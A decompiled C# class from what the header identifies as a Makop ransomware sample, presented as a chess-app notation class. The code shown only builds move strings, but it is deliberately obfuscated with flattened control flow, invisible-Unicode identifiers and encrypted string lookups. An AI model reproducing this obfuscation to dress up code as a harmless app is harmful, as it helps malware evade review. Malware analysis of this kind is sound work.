// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.Notation
// Assembly: NU, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5FD10F56-6E8A-4A54-94FE-02843CD215B9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-8545c59f6fe59b3a5cdbad8923aa9b4a109dc03f4c003bdba937eacaafbfbf3c.exe

using System.Runtime.InteropServices;

namespace SimpleChessApp.Game
{
  public class Notation
  {
    public Square from;
    public Square to;

    public string Move
    {
      get
      {
label_1:
        int num1 = 1153789846;
        string move;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1030482358)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              move = Notation.\u206E⁬‎‭‏‍‮⁭⁮‬‏‮‭⁯⁪⁫‍‮‭⁮‭‌⁭⁫‭‏‮‍⁪‎‭‬⁮⁭⁮⁯‏⁮‌‭‮(this.from.CurrentSquare, \u003CModule\u003E.\u202B‪​⁬⁪‏⁯⁮‍⁫⁯⁮‏​⁭‮⁫‮‫‬‪‌‮‫⁯‏‭‌‪‏⁬‎⁭⁬‎‬⁭‎⁭⁯‮<string>(1918848513U), this.to.CurrentSquare);
              num1 = (int) num2 * 150920020 ^ 526836166;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return move;
      }
    }

    public Notation(Square f, Square t, Board bo)
    {
label_1:
      int num1 = 2051373494;
      Square square1;
      Square square2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1683548216)) % 9U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1052175461 ^ 1416640579;
            continue;
          case 2:
            goto label_3;
          case 3:
            square2.Piece = new ChessPiece(t, t.Piece.Kind, t.Piece.Color);
            num1 = (int) num2 * -693557331 ^ -422296339;
            continue;
          case 4:
            square1.Piece = new ChessPiece(f, t.Piece.Kind, t.Piece.Color);
            num1 = (int) num2 * -1945010924 ^ 215903462;
            continue;
          case 5:
            square1 = new Square(f.File, f.Rank, bo);
            num1 = (int) num2 * 1292259748 ^ -188576710;
            continue;
          case 6:
            num1 = (int) num2 * 1120107634 ^ -966573519;
            continue;
          case 7:
            this.from = square1;
            this.to = square2;
            num1 = (int) num2 * 2021231136 ^ -232777584;
            continue;
          case 8:
            square2 = new Square(t.File, t.Rank, bo);
            num1 = (int) num2 * 651733536 ^ 2100319960;
            continue;
          default:
            goto label_11;
        }
      }
label_3:
      return;
label_11:;
    }

    public override string ToString() => this.Move;

    static string \u206E⁬‎‭‏‍‮⁭⁮‬‏‮‭⁯⁪⁫‍‮‭⁮‭‌⁭⁫‭‏‮‍⁪‎‭‬⁮⁭⁮⁯‏⁮‌‭‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }
  }
}
